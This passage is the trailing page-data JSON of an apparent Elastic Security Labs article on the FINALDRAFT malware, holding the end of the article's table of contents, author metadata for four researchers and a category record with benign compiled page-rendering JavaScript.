pipes","href":"#forwarding-data-from-tcp-udp-and-named-pipes"},{"level":3,"title":"File manipulation","href":"#file-manipulation"},{"level":3,"title":"Injected Modules","href":"#injected-modules"},{"level":4,"title":"Network enumeration (`ipconfig.x64.dll`)","href":"#network-enumeration-ipconfigx64dll"},{"level":4,"title":"PowerShell execution (`Psloader.x64.dll`)","href":"#powershell-execution-psloaderx64dll"},{"level":4,"title":"Pass-the-Hash toolkit (`pnt.x64.dll`)","href":"#pass-the-hash-toolkit-pntx64dll"},{"level":2,"title":"FINALDRAFT ELF variant","href":"#finaldraft-elf-variant"},{"level":3,"title":"Additional transport channels","href":"#additional-transport-channels"},{"level":3,"title":"Commands","href":"#commands-1"},{"level":4,"title":"Command Execution","href":"#command-execution"},{"level":4,"title":"Self Deletion","href":"#self-deletion"},{"level":2,"title":"Older FINALDRAFT PE sample","href":"#older-finaldraft-pe-sample"},{"level":3,"title":"HTTP transport channel","href":"#http-transport-channel"},{"level":3,"title":"Shell command ","href":"#shell-command-"},{"level":2,"title":"Tactics","href":"#tactics"},{"level":2,"title":"Techniques","href":"#techniques"},{"level":2,"title":"Detection","href":"#detection"},{"level":2,"title":"YARA","href":"#yara"}],"author":[{"title":"Cyril François","slug":"cyril-francois","description":"Elastic Security Labs Team Senior Research Engineer, Malware","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var i=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,_=Object.prototype.hasOwnProperty;var d=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),j=(t,e)=\u003e{for(var n in e)i(t,n,{get:e[n],enumerable:!0})},s=(t,e,n,o)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let a of f(e))!_.call(t,a)\u0026\u0026a!==n\u0026\u0026i(t,a,{get:()=\u003ee[a],enumerable:!(o=x(e,a))||o.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?m(g(t)):{},s(e||!t||!t.__esModule?i(n,\"default\",{value:t,enumerable:!0}):n,t)),y=t=\u003es(i({},\"__esModule\",{value:!0}),t);var u=d((w,c)=\u003e{c.exports=_jsx_runtime});var b={};j(b,{default:()=\u003eF,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Cyril Fran\\xE7ois\",description:\"Elastic Security Labs Team Senior Research Engineer, Malware\",slug:\"cyril-francois\"};function l(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(l,t)})):l(t)}var F=C;return y(b);})();\n;return Component;"},"_id":"authors/cyril-francois.mdx","_raw":{"sourceFilePath":"authors/cyril-francois.mdx","sourceFileName":"cyril-francois.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/cyril-francois"},"type":"Author","imageUrl":"","url":"/authors/cyril-francois"},{"title":"Jia Yu Chan","slug":"jia-yu-chan","description":"Elastic Security Labs Team Research Engineer, Malware","image":"jiayuchan.jpg","body":{"raw":"","code":"var Component=(()=\u003e{var g=Object.create;var i=Object.defineProperty;var j=Object.getOwnPropertyDescriptor;var x=Object.getOwnPropertyNames;var l=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var h=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),p=(t,e)=\u003e{for(var n in e)i(t,n,{get:e[n],enumerable:!0})},o=(t,e,n,c)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of x(e))!f.call(t,r)\u0026\u0026r!==n\u0026\u0026i(t,r,{get:()=\u003ee[r],enumerable:!(c=j(e,r))||c.enumerable});return t};var _=(t,e,n)=\u003e(n=t!=null?g(l(t)):{},o(e||!t||!t.__esModule?i(n,\"default\",{value:t,enumerable:!0}):n,t)),d=t=\u003eo(i({},\"__esModule\",{value:!0}),t);var u=h((D,s)=\u003e{s.exports=_jsx_runtime});var b={};p(b,{default:()=\u003eC,frontmatter:()=\u003ey});var a=_(u()),y={title:\"Jia Yu Chan\",description:\"Elastic Security Labs Team Research Engineer, Malware\",slug:\"jia-yu-chan\",image:\"jiayuchan.jpg\"};function m(t){return(0,a.jsx)(a.Fragment,{})}function M(t={}){let{wrapper:e}=t.components||{};return e?(0,a.jsx)(e,Object.assign({},t,{children:(0,a.jsx)(m,t)})):m(t)}var C=M;return d(b);})();\n;return Component;"},"_id":"authors/jia-yu-chan.mdx","_raw":{"sourceFilePath":"authors/jia-yu-chan.mdx","sourceFileName":"jia-yu-chan.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/jia-yu-chan"},"type":"Author","imageUrl":"/assets/images/authors/jiayuchan.jpg","url":"/authors/jia-yu-chan"},{"title":"Salim Bitam","slug":"salim-bitam","description":"Elastic Security Labs Team Research Engineer II, Malware","body":{"raw":"","code":"var Component=(()=\u003e{var l=Object.create;var i=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,_=Object.prototype.hasOwnProperty;var d=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),j=(t,e)=\u003e{for(var n in e)i(t,n,{get:e[n],enumerable:!0})},o=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let a of f(e))!_.call(t,a)\u0026\u0026a!==n\u0026\u0026i(t,a,{get:()=\u003ee[a],enumerable:!(s=x(e,a))||s.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?l(g(t)):{},o(e||!t||!t.__esModule?i(n,\"default\",{value:t,enumerable:!0}):n,t)),M=t=\u003eo(i({},\"__esModule\",{value:!0}),t);var m=d((D,c)=\u003e{c.exports=_jsx_runtime});var y={};j(y,{default:()=\u003ew,frontmatter:()=\u003eb});var r=p(m()),b={title:\"Salim Bitam\",description:\"Elastic Security Labs Team Research Engineer II, Malware\",slug:\"salim-bitam\"};function u(t){return(0,r.jsx)(r.Fragment,{})}function h(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(u,t)})):u(t)}var w=h;return M(y);})();\n;return Component;"},"_id":"authors/salim-bitam.mdx","_raw":{"sourceFilePath":"authors/salim-bitam.mdx","sourceFileName":"salim-bitam.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/salim-bitam"},"type":"Author","imageUrl":"","url":"/authors/salim-bitam"},{"title":"Daniel Stepanic","slug":"daniel-stepanic","description":"Elastic Security Labs Team Principal Security Researcher, Malware","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var i=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var x=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var _=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),g=(t,e)=\u003e{for(var n in e)i(t,n,{get:e[n],enumerable:!0})},s=(t,e,n,c)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let a of x(e))!f.call(t,a)\u0026\u0026a!==n\u0026\u0026i(t,a,{get:()=\u003ee[a],enumerable:!(c=p(e,a))||c.enumerable});return t};var j=(t,e,n)=\u003e(n=t!=null?m(d(t)):{},s(e||!t||!t.__esModule?i(n,\"default\",{value:t,enumerable:!0}):n,t)),M=t=\u003es(i({},\"__esModule\",{value:!0}),t);var u=_((w,o)=\u003e{o.exports=_jsx_runtime});var b={};g(b,{default:()=\u003eS,frontmatter:()=\u003ey});var r=j(u()),y={title:\"Daniel Stepanic\",description:\"Elastic Security Labs Team Principal Security Researcher, Malware\",slug:\"daniel-stepanic\"};function l(t){return(0,r.jsx)(r.Fragment,{})}function D(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(l,t)})):l(t)}var S=D;return M(b);})();\n;return Component;"},"_id":"authors/daniel-stepanic.mdx","_raw":{"sourceFilePath":"authors/daniel-stepanic.mdx","sourceFileName":"daniel-stepanic.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/daniel-stepanic"},"type":"Author","imageUrl":"","url":"/authors/daniel-stepanic"}],"category":[{"title":"Malware analysis","slug":"malware-analysis","body":{"raw":"","code":"var Component=(()=\u003e{var u=Object.create;var s=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),M=(t,n)=\u003e{for(var e in n)s(t,e,{get:n[e],enumerable:!0})},i=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let r of f(n))!g.call(t,r)\u0026\u0026r!==e\u0026\u0026s(t,r,{get:()=\u003en[r],enumerable:!(o=x(n,r))||o.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?u(_(t)):{},i(n||!t||!t.__esModule?s(e,\"default\",{value:t,enumerable:!0}):e,t)),p=t=\u003ei(s({},\"__esModule\",{value:!0}),t);var l=j((X,c)=\u003e{c.exports=_jsx_runtime});var D={};M(D,{default:()=\u003eC,frontmatter:()=\u003ew});var a=d(l()),w={title:\"Malware analysis\",slug:\"malware-analysis\"};function m(t){return(0,a.jsx)(a.Fragment,{})}function y(t={}){let{wrapper:n}=t.components||{};return n?(0,a.jsx)(n,Object.assign({},t,{children:(0,a.jsx)(m,t)})):m(t)}var C=y;return p(D);})();\n;return Component;"},"_id":"categories/malware-analysis.mdx","_raw":{"sourceFilePath":"categories/malware-analysis.mdx","sourceFileName":"malware-analysis.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/malware-analysis"},"type":"Category","url":"/categories/malware-analysis"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"finaldraft"},"buildId":"4Kiz4W6h6K4GvjoQBSLKb","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>